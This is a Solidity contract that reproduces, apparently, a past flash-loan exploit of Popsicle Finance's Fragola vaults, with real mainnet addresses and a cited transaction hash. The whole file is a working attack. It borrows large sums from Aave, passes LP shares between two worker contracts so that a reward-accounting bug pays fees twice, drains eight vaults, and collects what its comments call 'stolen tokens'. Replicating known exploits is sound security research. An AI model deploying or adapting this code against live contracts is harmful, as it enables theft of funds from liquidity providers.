// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./PopsicleWorker.sol";

import "v3-periphery/libraries/LiquidityAmounts.sol";
import "v3-core/libraries/TickMath.sol";

// Tx hash: 0xcd7dae143a4c0223349c16237ce4cd7696b1638d116a72755231ede872ab70fc
contract PopsicleExploiter {
    IAave private constant AAVE = IAave(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Like private constant WBTC = IERC20Like(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20Like private constant USDC = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Like private constant DAI = IERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20Like private constant UNI = IERC20Like(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);

    IFragola private constant USDT_WETH_FRAGOLA = IFragola(0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48);
    IFragola private constant USDC_WETH_FRAGOLA = IFragola(0xd63b340F6e9CCcF0c997c83C8d036fa53B113546);
    IFragola private constant WBTC_WETH_FRAGOLA = IFragola(0x0A8143EF65b0CE4C2fAD195165ef13772ff6Cca0);
    IFragola private constant USDT_WETH_FRAGOLA_2 = IFragola(0x98d149e227C75D38F623A9aa9F030fB222B3FAa3);
    IFragola private constant WBTC_USDC_FRAGOLA = IFragola(0xB53Dc33Bb39efE6E9dB36d7eF290d6679fAcbEC7);
    IFragola private constant USDC_WETH_FRAGOLA_2 = IFragola(0x6f3F35a268B3af45331471EABF3F9881b601F5aA);
    IFragola private constant DAI_WETH_FRAGOLA = IFragola(0xDD90112eAF865E4E0030000803ebBb4d84F14617);
    IFragola private constant UNI_WETH_FRAGOLA = IFragola(0xE22EACaC57A1ADFa38dCA1100EF17654E91EFd35);

    uint256 private constant INITIAL_USDT_AMOUNT = 30_000_000e6;
    uint256 private constant INITIAL_WETH_AMOUNT = 13_000e18;
    uint256 private constant INITIAL_WBTC_AMOUNT = 1_400e8 ;
    uint256 private constant INITIAL_USDC_AMOUNT = 30_000_000e6;
    uint256 private constant INITIAL_DAI_AMOUNT = 3_000_000e18;
    uint256 private constant INITIAL_UNI_AMOUNT = 200_000e18;

    PopsicleWorker private immutable workerA;
    PopsicleWorker private immutable workerB;

    struct Cache {
        address token0;
        address token1;
        uint160 sqrtPriceX96;
        uint160 sqrtRatioAX96;
        uint160 sqrtRatioBX96;
    }

    constructor() {
        workerA = new PopsicleWorker(); 
        workerB = new PopsicleWorker();

        USDT.approve(address(AAVE), type(uint256).max);
        WETH.approve(address(AAVE), type(uint256).max);
        WBTC.approve(address(AAVE), type(uint256).max);
        USDC.approve(address(AAVE), type(uint256).max);
        DAI.approve(address(AAVE), type(uint256).max);
        UNI.approve(address(AAVE), type(uint256).max);
    }

    function exploit() external {
        address receiverAddress = address(this);

        address[] memory assets = new address[](6);
        assets[0] = address(USDT);
        assets[1] = address(WETH);
        assets[3] = address(WBTC);
        assets[2] = address(USDC);
        assets[4] = address(DAI);
        assets[5] = address(UNI);

        uint256[] memory amounts = new uint256[](6);
        amounts[0] = INITIAL_USDT_AMOUNT;
        amounts[1] = INITIAL_WETH_AMOUNT;
        amounts[3] = INITIAL_WBTC_AMOUNT;
        amounts[2] = INITIAL_USDC_AMOUNT;
        amounts[4] = INITIAL_DAI_AMOUNT;
        amounts[5] = INITIAL_UNI_AMOUNT;

        uint256[] memory modes = new uint256[](6);

        address onBehalfOf = address(this);
        bytes memory params = "";
        uint16 referralCode = 0;

        AAVE.flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );

    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
    )
        external
        returns (bool)
    {
        IFragola[8] memory FRAGOLA = [
            USDT_WETH_FRAGOLA,
            USDC_WETH_FRAGOLA,
            WBTC_WETH_FRAGOLA,
            USDT_WETH_FRAGOLA_2,
            WBTC_USDC_FRAGOLA,
            USDC_WETH_FRAGOLA_2,
            DAI_WETH_FRAGOLA,
            UNI_WETH_FRAGOLA
        ];

        Cache memory cache; // Stack too deep

        for(uint256 i = 0; i < 8; ++i) {
            IUniswapV3Pool pool = IUniswapV3Pool(FRAGOLA[i].pool());
            cache.token0 = FRAGOLA[i].token0();
            cache.token1 = FRAGOLA[i].token1();
            cache.sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(FRAGOLA[i].tickLower());
            cache.sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(FRAGOLA[i].tickUpper());

            uint256 balance0 = IERC20Like(cache.token0).balanceOf(address(this));
            uint256 balance1 = IERC20Like(cache.token1).balanceOf(address(this));
            if (cache.token0 == address(USDT)) {
                IUSDT(cache.token0).approve(address(FRAGOLA[i]), balance0);
            } else {
                IERC20Like(cache.token0).approve(address(FRAGOLA[i]), balance0);
            }
            if (cache.token1 == address(USDT)) {
                IUSDT(cache.token1).approve(address(FRAGOLA[i]), balance1);
            } else {
                IERC20Like(cache.token1).approve(address(FRAGOLA[i]), balance1);
            }

            // Mint LP shares
            (uint256 shares,,) = FRAGOLA[i].deposit(balance0, balance1);
            // Transfer to Worker A
            FRAGOLA[i].transfer(address(workerA), shares);

            // Update fee rewards for workerA, then transfer LP tokens to workerB.
            // token0PerSharePaid and token1PerSharePaid set to 0 for new user instead of expected value
            // so rewards are inflated in feeEarned calculations.
            workerA.collect(address(FRAGOLA[i]), 0, 0);
            workerA.transferTokens(address(FRAGOLA[i]), address(workerB));

            // Update fee rewards for worker B
            workerB.collect(address(FRAGOLA[i]), 0, 0);
            workerB.transferTokens(address(FRAGOLA[i]), address(this));

            // Withdraw liquidity 
            FRAGOLA[i].withdraw(FRAGOLA[i].balanceOf(address(this)));

            // Collect rewards from workerA. Check if there's enough liquidity.
            (uint256 token0Rewards, uint256 token1Rewards,,) = FRAGOLA[i].userInfo(address(workerA));
            (uint128 liquidityCurr,,,,) = FRAGOLA[i].position();
            (cache.sqrtPriceX96,,,,,,) = pool.slot0();
            uint128 liquidityNeeded = LiquidityAmounts.getLiquidityForAmounts(
                cache.sqrtPriceX96,
                cache.sqrtRatioAX96,
                cache.sqrtRatioBX96,
                token0Rewards,
                token1Rewards
            );

            if (liquidityNeeded <= liquidityCurr) {
                workerA.collect(address(FRAGOLA[i]), token0Rewards, token1Rewards);
            } else {
                (uint256 amount0, uint256 amount1) = LiquidityAmounts.getAmountsForLiquidity(
                    cache.sqrtPriceX96,
                    cache.sqrtRatioAX96,
                    cache.sqrtRatioBX96,
                    liquidityCurr
                );
                workerA.collect(address(FRAGOLA[i]), amount0, amount1);
            }

            // Collect rewards from workerB
            (token0Rewards, token1Rewards,,) = FRAGOLA[i].userInfo(address(workerB));
            (liquidityCurr,,,,) = FRAGOLA[i].position();
            (cache.sqrtPriceX96,,,,,,) = pool.slot0();
            liquidityNeeded = LiquidityAmounts.getLiquidityForAmounts(
                cache.sqrtPriceX96,
                cache.sqrtRatioAX96,
                cache.sqrtRatioBX96,
                token0Rewards,
                token1Rewards
            );
            if (liquidityNeeded <= liquidityCurr) {
                workerB.collect(address(FRAGOLA[i]), token0Rewards, token1Rewards);
            } else {
                (uint256 amount0, uint256 amount1) = LiquidityAmounts.getAmountsForLiquidity(
                    cache.sqrtPriceX96,
                    cache.sqrtRatioAX96,
                    cache.sqrtRatioBX96,
                    liquidityCurr
                );
                workerB.collect(address(FRAGOLA[i]), amount0, amount1);
            }

            // Collect leftovers
            (token0Rewards, token1Rewards,,) = FRAGOLA[i].userInfo(address(workerB));
            (liquidityCurr,,,,) = FRAGOLA[i].position();
            (cache.sqrtPriceX96,,,,,,) = pool.slot0();
            balance0 = IERC20Like(cache.token0).balanceOf(address(FRAGOLA[i]));
            balance1 = IERC20Like(cache.token1).balanceOf(address(FRAGOLA[i]));
            uint256 remaining0 = balance0 < token0Rewards ? balance0 : token0Rewards;
            uint256 remaining1 = balance1 < token1Rewards ? balance1 : token1Rewards;
            liquidityNeeded = LiquidityAmounts.getLiquidityForAmounts(
                cache.sqrtPriceX96,
                cache.sqrtRatioAX96,
                cache.sqrtRatioBX96,
                remaining0,
                remaining1
            );
            workerB.collect(address(FRAGOLA[i]), remaining0, remaining1);
        }

        // Transfer stolen tokens from worker contracts to exploiter
        workerA.transferTokens(address(USDT), address(this));
        workerA.transferTokens(address(WETH), address(this));
        workerA.transferTokens(address(WBTC), address(this));
        workerA.transferTokens(address(USDC), address(this));
        workerA.transferTokens(address(DAI), address(this));
        workerA.transferTokens(address(UNI), address(this));

        workerB.transferTokens(address(USDT), address(this));
        workerB.transferTokens(address(WETH), address(this));
        workerB.transferTokens(address(WBTC), address(this));
        workerB.transferTokens(address(USDC), address(this));
        workerB.transferTokens(address(DAI), address(this));
        workerB.transferTokens(address(UNI), address(this));

        return true;
    }
}
